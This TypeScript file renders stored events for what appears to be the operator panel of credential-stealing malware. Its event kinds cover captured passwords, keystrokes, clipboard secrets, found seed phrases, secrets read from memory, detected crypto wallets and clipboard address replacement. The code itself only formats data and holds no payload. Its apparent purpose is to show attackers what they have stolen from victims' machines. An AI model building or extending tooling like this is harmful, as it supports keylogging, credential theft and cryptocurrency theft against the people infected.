/**
 * One render model for persisted events. `legacy` is always carried untouched;
 * the structured fields exist so kind/data survive even when legacy is empty.
 */
export type EventField = { label: string; value: string };

export type EventView = {
  kind: string;
  title: string;
  legacy: string;
  fields: EventField[];
};

const text = (value: unknown): string => {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' || typeof value === 'boolean') return String(value);
  if (value == null) return '';
  try {
    return JSON.stringify(value);
  } catch {
    return String(value);
  }
};

const fallback = (data: Record<string, unknown>): string => {
  const path = text(data.path);
  if (path) return path;
  const target = text(data.target);
  if (target) return target;
  const json = text(data);
  return json === '{}' ? '—' : json;
};

const pick = (data: Record<string, unknown>, keys: string[]): EventField[] => {
  const fields: EventField[] = [];
  for (const key of keys) {
    if (!(key in data)) continue;
    const value = text(data[key]);
    if (value) fields.push({ label: key, value });
  }
  return fields;
};

const rest = (data: Record<string, unknown>, handled: string[]): EventField[] => {
  const fields: EventField[] = [];
  for (const key of Object.keys(data)) {
    if (handled.includes(key)) continue;
    const value = text(data[key]);
    if (value) fields.push({ label: key, value });
  }
  return fields;
};

/** Never drops data: unknown kinds and extra keys fall through to the generic view. */
export function eventView(event: { kind: string; data?: Record<string, unknown> | null; legacy?: string | null } | null | undefined): EventView {
  const kind = event?.kind ?? 'unknown';
  const data = event?.data ?? {};
  const legacy = event?.legacy ?? '';
  const view = (title: string, fields: EventField[]): EventView => ({ kind, title, legacy, fields });
  switch (kind) {
    case 'wallet_detected': {
      const keys = ['name', 'pid', 'title'];
      return view('Wallet detected', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'wallet_closed': {
      const keys = ['pid'];
      return view('Wallet closed', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'password': {
      const keys = ['process', 'title', 'text'];
      return view('Password captured', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'clipboard_secret': {
      const keys = ['kind', 'value', 'process', 'title', 'words'];
      return view('Clipboard secret', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'clipboard_replace': {
      const keys = ['coin', 'original', 'replacement'];
      return view('Clipboard replaced', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'keystroke': {
      const keys = ['process', 'title', 'text'];
      return view('Keystroke', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'clipboard': {
      const keys = ['process', 'title', 'content', 'kind'];
      return view('Clipboard', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'seed_found': {
      const keys = ['words', 'value'];
      return view('Seed found', [...pick(data, keys), ...rest(data, keys)]);
    }
    case 'secret_found': {
      const keys = ['secret_kind', 'confident', 'value'];
      return view('Secret found in memory', [...pick(data, keys), ...rest(data, keys)]);
    }
    default: {
      const keys = ['path', 'target'];
      const fields = pick(data, keys);
      if (fields.length > 0) fields.push(...rest(data, keys));
      else if (Object.keys(data).length > 0) fields.push(...rest(data, []));
      else fields.push({ label: 'detail', value: fallback(data) });
      return view(kind, fields);
    }
  }
}
